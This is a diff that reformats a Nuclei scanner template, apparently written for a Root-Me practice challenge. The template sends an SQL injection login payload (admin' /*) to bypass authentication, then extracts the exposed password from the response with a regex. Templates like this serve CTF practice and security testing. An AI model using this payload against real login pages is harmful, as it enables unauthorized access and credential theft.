@@ -1,32 +1,31 @@
 id: SQLinjection-Authentication
-
 info:
-  name: SQL injection authentification
   author: Tomitom13
+  name: SQL injection authentification
   severity: unknown
   tags: sql-injection,authentification,rootme
-
 requests:
-  - raw:
-      - |
-        POST / HTTP/1.1
-        Content-Type: application/x-www-form-urlencoded
+- extractors:
+  - name: password
+    part: body
+    regex:
+    - password" value="[a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
+    type: regex
+  matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    regex:
+    - 'password :'
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'POST / HTTP/1.1
 
-        login=admin%27+%2F*+&password=anything
+    Content-Type: application/x-www-form-urlencoded
 
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: regex
-        regex:
-          - "password :"
-        part: body
 
-    extractors:
-      - type: regex
-        name: password
-        part: body
-        regex:
-          - 'password" value="[a-zA-Z0-9!@#$%^&*()_+,.<>?]+"'
+    login=admin%27+%2F*+&password=anything
+
+    '
